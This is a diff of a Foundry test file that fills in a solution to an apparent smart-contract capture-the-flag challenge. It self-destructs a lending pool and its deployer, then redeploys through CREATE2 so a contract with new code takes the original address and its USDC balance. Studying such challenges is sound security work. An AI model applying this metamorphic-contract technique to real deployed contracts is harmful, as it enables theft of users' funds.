@@ -71,10 +71,13 @@ contract Challenge3Test is Test {
         // terminal command to run the speciffic test:                        //
         // forge test --match-contract Challenge3Test -vvvv                   //
         //////////////////////////////////////////////////////////////////////*/
+        // Step 1.  We are the hacker, the owner of the lendingPool and the createDeployer. We need to selfDestruct both these contracts with the available methods.
+        console.log("Me the hacker ", hacker);
+        console.log("lendingPool owner ", lendingPool.owner());
+        console.log("createDeployer owner ", createDeployer.owner());
 
-
-
-    
+        lendingPool.emergencyStop();
+        createDeployer.cleanUp();
         //====================================================================//
         vm.stopPrank();
     }
@@ -89,8 +92,16 @@ contract Challenge3Test is Test {
         // forge test --match-contract Challenge3Test -vvvv           //
         //////////////////////////////////////////////////////////////*/
 
+        // Step 2. use create2Deployer to create the contract on a deterministic address. 
+        // createDeployer has the same address as the original, and the nonce has been reset to 0. We can now create a new lendingPool (lendingHack) contract with different code.
+        // CREATE and CREATE2 use the following to calculate the address of the new contract:
+        //CREATE   (0x00..msg.sender)  + nonce
+        //CREATE2   (0xFF..msg.sender)  + salt   +  creation code
 
-
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        lendingPool = LendingPool(createDeployer.deploy(false, address(usdc)));
+        // The original lending pool was given the balance of USDC that we want. This contract now has the same address, so it holds access to the USDC.
+        console.log("LendingPool Hack USDC ", usdc.balanceOf(address(lendingPool)));
 
         //=============================================================//
         vm.stopPrank();
